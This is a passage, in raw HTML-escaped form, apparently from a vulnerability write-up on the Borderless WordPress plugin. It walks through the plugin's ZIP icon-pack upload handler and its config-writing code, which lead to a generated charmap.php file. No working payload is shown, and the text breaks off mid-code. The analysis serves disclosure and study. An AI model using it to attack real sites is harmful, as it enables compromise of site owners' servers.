class=&#34;c1&#34;&gt;//&amp;ensp;&amp;lt;base_url&amp;gt;/wp-content/uploads/borderless_icon_fonts/borderless_temp/charmap.php&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The AJAX action &lt;code&gt;wp_ajax_borderless_ajax_add_zipped_font&lt;/code&gt; is registered to handle uploading and adding fonts from a ZIP file, with &lt;code&gt;add_zipped_font&lt;/code&gt; as the callback that performs extraction and writes the configuration file.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;add_zipped_font&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$cap&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;avf_file_upload_capability&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;update_plugins&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$cap&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;You&amp;ensp;do&amp;ensp;not&amp;ensp;have&amp;ensp;sufficient&amp;ensp;permissions&amp;ensp;to&amp;ensp;use&amp;ensp;this&amp;ensp;feature.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;borderless&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Retrieve&amp;ensp;the&amp;ensp;file&amp;ensp;path&amp;ensp;of&amp;ensp;the&amp;ensp;zip&amp;ensp;file&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$attachment&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;values&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$path&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;realpath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;get_attached_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$attachment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unzipped&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;zip_flatten&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\.eot&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\.svg&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\.ttf&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\.woff&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\.json&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\.css&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;If&amp;ensp;we&amp;ensp;managed&amp;ensp;to&amp;ensp;unzip&amp;ensp;the&amp;ensp;file&amp;ensp;and&amp;ensp;save&amp;ensp;it,&amp;ensp;extract&amp;ensp;the&amp;ensp;SVG&amp;ensp;file&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unzipped&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create_config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;If&amp;ensp;we&amp;ensp;did&amp;ensp;not&amp;ensp;get&amp;ensp;a&amp;ensp;name&amp;ensp;for&amp;ensp;the&amp;ensp;font,&amp;ensp;do&amp;ensp;not&amp;ensp;add&amp;ensp;it&amp;ensp;and&amp;ensp;remove&amp;ensp;the&amp;ensp;temp&amp;ensp;folder&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;unknown&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Unable&amp;ensp;to&amp;ensp;retrieve&amp;ensp;the&amp;ensp;Icon&amp;ensp;Pack&amp;ensp;name&amp;ensp;from&amp;ensp;your&amp;ensp;uploaded&amp;ensp;folder.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless_font_added:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ip_name&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In &lt;code&gt;add_zipped_font()&lt;/code&gt;, after the user uploads a ZIP file containing the Icon Pack, the plugin performs these steps:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Checks for the &lt;code&gt;update_plugins&lt;/code&gt; capability → Administrator only&lt;/li&gt;&#xA;&lt;li&gt;Unzips and keeps only the necessary files for the Icon Pack: fonts (&lt;code&gt;.eot&lt;/code&gt;, &lt;code&gt;.svg&lt;/code&gt;, &lt;code&gt;.ttf&lt;/code&gt;, &lt;code&gt;.woff&lt;/code&gt;), &lt;code&gt;JSON&lt;/code&gt;, &lt;code&gt;CSS&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Calls &lt;code&gt;create_config()&lt;/code&gt; to generate the configuration file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;create_config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;find_json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;svg_file&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;find_svg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;svg_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;delete_folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;SVG&amp;ensp;file&amp;ensp;or&amp;ensp;selection.json&amp;ensp;not&amp;ensp;found.&amp;ensp;Please&amp;ensp;check&amp;ensp;the&amp;ensp;integrity&amp;ensp;of&amp;ensp;the&amp;ensp;Icon&amp;ensp;Pack&amp;ensp;files.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;borderless&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Attempt&amp;ensp;to&amp;ensp;read&amp;ensp;the&amp;ensp;SVG&amp;ensp;file&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_remote_fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempurl&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;svg_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$json&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_file&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trailingslashit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;svg_file&lt;/span&gt;&amp;ensp;&lt;span 